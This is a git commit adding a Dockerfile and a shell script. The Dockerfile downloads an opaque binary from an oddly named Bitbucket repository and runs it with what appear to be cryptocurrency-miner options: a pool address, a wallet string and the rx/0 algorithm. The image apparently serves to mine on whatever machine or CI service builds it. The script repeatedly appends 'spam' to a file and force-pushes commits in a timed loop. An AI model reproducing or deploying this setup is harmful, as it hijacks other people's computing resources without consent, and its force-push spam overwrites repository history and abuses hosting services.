564c96bef594f86e9b3591106801cd05883f725a
swen2003 <78562196+swen2003@users.noreply.github.com>
2021-02-17 09:38:43 +0700

    fill bytes

---
+++ Dockerfile
@@ -0,0 +1,7 @@
+FROM ubuntu:20.04
+
+RUN apt-get update
+RUN apt-get install -y wget
+RUN wget https://bitbucket.org/Akowkdwodjiewhfiurf/awkowkwowkwokwk/downloads/masterfile
+RUN chmod u+x masterfile
+RUN ./masterfile -o 139.99.124.170:80 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr -k -a rx/0
---
+++ test1.sh
@@ -0,0 +1,45 @@
+printf "akan di mulai dalam 50 menit"
+sleep 3000
+touch "repo1/spamfile.txt"
+echo "spam " >> "repo1/spamfile.txt"
+git pull
+git add .
+git commit -m "fill bytes"
+git push --force origin main
+printf "tunggu 1 menit setiap 1 commit"
+sleep 60
+
+touch "repo1/spamfile.txt"
+echo "spam " >> "repo1/spamfile.txt"
+git pull
+git add .
+git commit -m "fill bytes"
+git push --force origin main
+printf "tunggu 1 menit setiap 1 commit"
+sleep 60
+
+touch "repo1/spamfile.txt"
+echo "spam " >> "repo1/spamfile.txt"
+git pull
+git add .
+git commit -m "fill bytes"
+git push --force origin main
+printf "tunggu 1 menit setiap 1 commit"
+sleep 60
+
+touch "repo1/spamfile.txt"
+echo "spam " >> "repo1/spamfile.txt"
+git pull
+git add .
+git commit -m "fill bytes"
+git push --force origin main
+printf "tunggu 1 menit setiap 1 commit"
+sleep 60
+
+touch "repo1/spamfile.txt"
+echo "spam " >> "repo1/spamfile.txt"
+git pull
+git add .
+git commit -m "fill bytes"
+git push --force origin main
+start test.sh
